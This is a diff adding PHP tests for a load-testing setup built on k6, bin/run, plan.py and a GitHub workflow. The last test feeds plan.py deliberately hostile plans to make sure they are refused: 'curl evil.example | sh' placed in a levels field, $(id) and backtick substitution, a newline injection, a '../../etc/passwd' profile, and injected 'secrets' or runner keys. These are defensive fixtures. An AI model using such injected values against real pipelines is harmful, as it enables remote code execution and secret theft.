@@ -136,3 +136,128 @@ test('every docs/devops page the load-test docs point at exists', function () {
         }
     }
 });
+
+test('the think-time override defaults to each page\'s own pauses, and bin/run passes it to k6', function () {
+    $lib = loadtestFile('loadtest/k6/lib.js');
+    $run = loadtestFile('loadtest/bin/run');
+
+    // Unset, every scenario keeps the ranges the earlier runs were measured with (1–3 s unless a page says otherwise).
+    expect($lib)->toContain('export function think(min = 1, max = 3) {')
+        ->and($lib)->toContain("parseFloat(__ENV.THINK_MIN || '')")
+        ->and($lib)->toContain("parseFloat(__ENV.THINK_MAX || '')")
+        ->and($run)->toContain('think=""')
+        ->and($run)->toContain('think_env=(-e THINK_MIN="${think% *}" -e THINK_MAX="${think#* }")')
+        ->and($run)->toContain('${think_env[@]+"${think_env[@]}"}')
+        // Checked before anything runs: no 0 s pause, and a warm-up duration k6 accepts.
+        ->and($run)->toContain('[[ "$think" =~ ^[1-9][0-9]*\\ [1-9][0-9]*$ ]]')
+        ->and(strpos($run, '[[ "$warmup" =~ ^[0-9]+[sm]$ ]] || {'))->toBeLessThan(strpos($run, 'for d in "${level_duration:-'));
+});
+
+test('bin/run stops one level past saturation by the same rule summarize.py reports', function () {
+    $run = loadtestFile('loadtest/bin/run');
+    $summarize = loadtestFile('loadtest/bin/summarize.py');
+
+    expect($summarize)->toContain('P95_LIMIT_MS = 1000')
+        ->and($summarize)->toContain('ERROR_LIMIT = 0.01')
+        ->and($summarize)->toContain('SATURATED = 3')
+        ->and($summarize)->toContain("'saturation': saturation(levels)");
+    // The exit code bin/run treats as "saturated" is the one --check-level returns.
+    expect($run)->toContain('python3 loadtest/bin/summarize.py --check-level "$results/k6-${vus}.json" || rc=$?')
+        ->and($run)->toContain('if [ "$rc" = 3 ] || [ "$past_limit" -ge 1 ]; then')
+        ->and($run)->toContain('[ "$stop_at_saturation" = 1 ] && [ "$past_limit" -ge 2 ]')
+        ->and($run)->toContain('"levels": "${levels_run}".split()');
+});
+
+test('the label runs are few, name real profiles and pass the plan rules', function () {
+    $plan = json_decode(loadtestFile('loadtest/label-runs.json'), true, flags: JSON_THROW_ON_ERROR);
+    $script = loadtestFile('loadtest/bin/plan.py');
+    preg_match('/^MAX_LABEL_RUNS = (\d+)$/m', $script, $max);
+    preg_match_all("/^    '([a-z_]+)': r'([^']+)',$/m", $script, $rules, PREG_SET_ORDER);
+    expect($rules)->not->toBeEmpty();
+
+    expect($plan['runs'])->toBeArray()->not->toBeEmpty()
+        ->and(count($plan['runs']))->toBeLessThanOrEqual((int) $max[1]);
+    $names = [];
+    foreach ($plan['runs'] as $run) {
+        expect(file_exists(LOADTEST_ROOT."/loadtest/profiles/{$run['profile']}.env"))->toBeTrue("no profile {$run['profile']}");
+        // The standard runner has 4 CPUs: large would be skipped by --require-fit, so a label run of it is wasted.
+        expect($run['profile'])->toBeIn(['small', 'medium']);
+        foreach ($rules as [, $key, $pattern]) {
+            if (isset($run[$key])) {
+                expect(preg_match('/^(?:'.$pattern.')$/', (string) $run[$key]))->toBe(1, "{$key} {$run[$key]}");
+            }
+        }
+        $names[] = $run['name'];
+    }
+    expect(array_unique($names))->toHaveCount(count($names));
+});
+
+test('the load-test workflow takes its matrix from plan.py and keeps the label path on the standard runner', function () {
+    $workflow = loadtestFile('.github/workflows/load-test.yml');
+    $script = loadtestFile('loadtest/bin/plan.py');
+
+    expect($workflow)->not->toContain('pull_request_target')
+        ->and($workflow)->toContain("permissions:\n    contents: read")
+        ->and($workflow)->toContain('python3 loadtest/bin/plan.py --label loadtest/label-runs.json')
+        ->and($workflow)->toContain("runs-on: \${{ github.event_name == 'workflow_dispatch' && inputs.runner || 'ubuntu-24.04' }}")
+        ->and($workflow)->toContain("ALLOW_SMALLER: \${{ github.event_name == 'workflow_dispatch' && inputs.allow_smaller_runner && '1' || '' }}")
+        ->and(substr_count($workflow, 'uses: actions/checkout@'))->toBe(substr_count($workflow, 'persist-credentials: false'));
+
+    // Every matrix key the workflow reads is one plan.py emits.
+    preg_match("/out = \{(.*?)\*\*defaults\}/s", $script, $out);
+    preg_match_all("/'([a-z_]+)':/", $out[1] ?? '', $keys);
+    preg_match_all('/matrix\.([a-z_]+)/', $workflow, $used);
+    expect(array_values(array_diff(array_unique($used[1]), $keys[1])))->toBe([]);
+});
+
+test('a billing day that does not finish is reported, not summed to a short time', function () {
+    // Run 41198972155: on the small profile automation:run stopped after two tasks and the summary said "0.0 s".
+    expect(loadtestFile('loadtest/bin/run'))->toContain('|| automation_rc=$?')
+        ->and(loadtestFile('loadtest/bin/run'))->toContain('> "$results/automation-exit.json"')
+        ->and(loadtestFile('loadtest/bin/summarize.py'))->toContain("load(run / 'automation-exit.json', {})");
+});
+
+/** Runs loadtest/bin/plan.py --label on $plan. @return array{int, string, string} exit code, stdout, stderr */
+function loadtestPlan(array $plan): array
+{
+    $file = tempnam(sys_get_temp_dir(), 'pr543-plan-');
+    file_put_contents($file, json_encode($plan, JSON_THROW_ON_ERROR));
+    $process = proc_open(['python3', LOADTEST_ROOT.'/loadtest/bin/plan.py', '--label', $file], [1 => ['pipe', 'w'], 2 => ['pipe', 'w']], $pipes);
+    expect($process)->not->toBeFalse('python3 should run plan.py');
+    $out = (string) stream_get_contents($pipes[1]);
+    $err = (string) stream_get_contents($pipes[2]);
+    $status = proc_close($process);
+    unlink($file);
+
+    return [$status, $out, $err];
+}
+
+test('plan.py turns a valid plan into the matrix', function () {
+    [$status, $out] = loadtestPlan(['runs' => [['name' => 'a', 'profile' => 'small', 'levels' => '50 100', 'think' => '10 30']]]);
+
+    expect($status)->toBe(0)
+        ->and(json_decode($out, true)[0])->toMatchArray(['name' => 'a', 'profile' => 'small', 'levels' => '50 100', 'think' => '10 30']);
+});
+
+test('plan.py refuses a hostile or wasteful plan before anything reaches a shell', function (array $runs, string $reason) {
+    [$status, $out, $err] = loadtestPlan(['runs' => $runs]);
+
+    // A refused plan prints no matrix, so the load job never starts.
+    expect($status)->not->toBe(0)
+        ->and($out)->toBe('')
+        ->and($err)->toContain($reason);
+})->with([
+    'unknown key' => [[['profile' => 'small', 'secrets' => 'inherit']], "unknown key 'secrets'"],
+    'runner' => [[['profile' => 'small', 'runner' => 'self-hosted']], "unknown key 'runner'"],
+    'allow_smaller_runner' => [[['profile' => 'large', 'allow_smaller_runner' => true]], "unknown key 'allow_smaller_runner'"],
+    'command in levels' => [[['profile' => 'small', 'levels' => '5; curl evil.example | sh']], 'levels'],
+    'substitution in name' => [[['profile' => 'small', 'name' => 'a$(id)']], 'name'],
+    'backticks in duration' => [[['profile' => 'small', 'level_duration' => '1m`id`']], 'level_duration'],
+    'newline in think' => [[['profile' => 'small', 'think' => "10 30\nid"]], 'think'],
+    'unknown profile' => [[['profile' => '../../etc/passwd']], 'profile must be one of'],
+    'more than 3 runs' => [array_fill(0, 4, ['profile' => 'small']), '1 to 3 runs'],
+    'no runs' => [[], '1 to 3 runs'],
+    'think 0 0' => [[['profile' => 'small', 'think' => '0 0']], 'think'],
+    'think minimum 0' => [[['profile' => 'small', 'think' => '0 30']], 'think'],
+    'think reversed' => [[['profile' => 'small', 'think' => '30 10']], 'the smaller number first'],
+]);
